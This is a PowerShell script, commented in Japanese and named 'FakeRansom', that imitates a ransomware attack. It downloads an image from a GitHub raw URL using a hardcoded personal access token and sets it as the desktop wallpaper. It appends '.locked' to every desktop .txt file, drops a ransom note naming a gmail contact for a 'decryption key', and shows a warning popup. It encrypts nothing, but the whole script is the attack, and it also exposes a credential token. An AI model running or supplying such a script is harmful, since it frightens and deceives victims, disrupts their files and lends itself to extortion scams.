# PowerShellスクリプト：FakeRansom_JP_GitHubWall.ps1

# 設定
$token = "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" # PATを貼る
$url = "https://raw.githubusercontent.com/cyberattackerdemo/main/main/yourpcishacked.jpg"
$imgPath = "$env:PUBLIC\yourpcishacked.jpg"
$desktop = [Environment]::GetFolderPath("Desktop")

# ▼ 警告ファイル
$warning = @"
あなたのファイルは暗号化されました。
復号キーを取得するには、以下に連絡してください：
cyber.attacker.demo@gmail.com
"@

# GitHubから画像ダウンロード
$headers = @{ Authorization = "token $token" }
$response = Invoke-WebRequest -Uri $url -Headers $headers -OutFile $imgPath

# 壁紙設定
$code = @"
using System.Runtime.InteropServices;

public class Wallpaper {
  [DllImport("user32.dll", SetLastError = true)]
  public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@
Add-Type $code
[Wallpaper]::SystemParametersInfo(20, 0, $imgPath, 3)

# デスクトップ上の .txt ファイルを改名
Get-ChildItem $desktop -Filter *.txt | ForEach-Object {
    Rename-Item $_.FullName ($_.Name + ".locked")
}

# 警告テキスト出力
Set-Content -Path "$desktop\README_復元したくない人は読まないでください.txt" -Value $warning

# メッセージ表示
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show("あなたのPCは侵害されました！復号キーが必要です。元に戻したい場合はDesktopのテキストファイルを確認してください。", "警告", 0, 'Warning')
